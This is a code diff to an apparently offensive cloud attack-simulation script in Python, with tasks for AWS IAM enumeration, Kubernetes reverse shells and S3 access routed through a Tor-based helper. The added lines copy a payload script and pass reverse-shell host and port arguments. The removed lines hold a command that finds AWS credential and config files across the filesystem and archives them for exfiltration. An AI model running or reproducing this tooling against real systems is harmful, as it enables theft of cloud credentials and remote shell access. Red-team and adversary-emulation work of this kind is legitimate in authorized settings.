@@ -517,7 +517,7 @@ echo $BUCKET_URL
                 session.log("credentialed_access_tor complete")
             elif task_name == "scan2kubeshell":
                 csp = "aws"
-                enum_exfil_prep_creds(csp, task_name)
+                enum_exfil_prep_creds(csp, "iam2enum")
                 session.log("running iam2enum enumeration...")
                 credentialed_access_tor(
                     csp=csp,
@@ -527,6 +527,17 @@ echo $BUCKET_URL
                     args="--profile=default"
                 )
                 session.log("iam2enum enumeration complete")
+
+                tmp_dir = Path("/tmp")
+                # create work directory
+                task_path = Path(f"/{task_name}")
+                if task_path.exists() and task_path.is_dir():
+                    shutil.rmtree(task_path)
+                task_path.mkdir(parents=True)
+
+                # copy our payload to the local working directory
+                task_script = Path(f"{script_dir}/../resources/{task_name}.sh")
+                shutil.copy2(task_script, task_path)
                 session.log(
                     "running scan2kubeshell credentialed_access_tor...")
                 credentialed_access_tor(
@@ -537,16 +548,10 @@ echo $BUCKET_URL
                     args=f'--reverse-shell-host={reverse_shell_host} --reverse-shell-port={reverse_shell_port}'
                 )
                 session.log("credentialed_access_tor complete")
-
-                # create an archive of all aws creds
-                payload = 'tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\')'
-                session.log("payload loaded and ready")
-                result = run_base64_payload(
-                    session=session, payload=payload, log_name="payload_awscreds")
             elif task_name == "kube2s3":
                 csp = "aws"
                 # context here is we're inside pod that has access to s3
-                enum_exfil_prep_creds(csp, task_name)
+                enum_exfil_prep_creds(csp, "iam2enum")
                 session.log("running iam2enum enumeration...")
                 # here we'll have instance credentials from the pod
                 credentialed_access_tor(
